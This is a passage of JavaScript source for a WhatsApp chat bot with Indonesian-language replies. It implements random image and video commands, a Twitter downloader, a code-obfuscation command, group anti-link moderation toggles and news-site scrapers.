if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tataconn.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
kyy.sendMessage(m.sender, { image: { url: yeha }, caption : '© Hanako Ai 2023 - 2024'}, { quoted: m })
}
break
case 'tiktokgirl':
await loading()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await loading()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await loading()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await loading()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await loading()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await loading()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await loading()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
kyy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return reply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
kyy.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	reply(`Verify that the link is from Twitter`)
	}
}
break
case 'obfus': case 'obfuscate':{
if (!q) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
reply(`Success
${meg.result}`)
}
break
case 'autodownload':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.autodonlod) return reply('sudah aktif!')
global.autodonlod = true
reply('mode auto download aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return reply('sudah dimatikan!')
global.autodonlod = false
reply('mode auto download matikan')
} else reply('on / off')
break //Powered By conn & Darwin
case 'listgc': {
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*[ Group Chat ]*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await kyy.groupMetadata(i)
teks += `∘ *Name* : ${metadata.subject}
∘ *Owner* : ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
∘ *Id* : ${metadata.id}
∘ *Made* : ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
∘ *Member* : ${metadata.participants.length}\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n`
}
kyy.sendTextWithMentions(m.chat, teks, m)
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiVirtex) return m.reply('_Sudah Diaktifkan_')
ntvirtex.push(from)
fs.writeFileSync('./database/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiVirtex) return m.reply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('_Sudah Diaktifkan_')
ntilinkytvid.push(from)
fs.writeFileSync('./database/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('_Sudah Diaktifkan_')
ntilinkytch.push(from)
fs.writeFileSync('./database/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('_Sudah Diaktifkan_')
ntilinkig.push(from)
fs.writeFileSync('./database/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('_Sudah Diaktifkan_')
ntilinkfb.push(from)
fs.writeFileSync('./database/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('_Sudah Diaktifkan_')
ntilinktg.push(from)
fs.writeFileSync('./database/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('_Sudah Diaktifkan_')
ntilinktt.push(from)
fs.writeFileSync('./database/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinktwt.push(from)
fs.writeFileSync('./database/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkall': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinkall.push(from)
fs.writeFileSync('./database/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//

//=================================================//
case "antiasing":{
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiAsing) return m.reply('_Sudah Diaktifkan_')
ntasing.push(from)
fs.writeFileSync('./database/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return m.reply('_Sudah Dimatikan_')
let off = ntasing.indexOf(from)
ntasing.splice(off, 1)
fs.writeFileSync('./database/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antiwame': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiWame) return m.reply('_Sudah Diaktifkan_')
ntwame.push(from)
fs.writeFileSync('./database/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiWame) return m.reply('_Sudah Dimatikan_')
let off = ntwame.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses matikan ${command} di group ini_`)
}
}
break
case 'fajar':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'cnn':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tribun':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'indozone':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'kompas':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
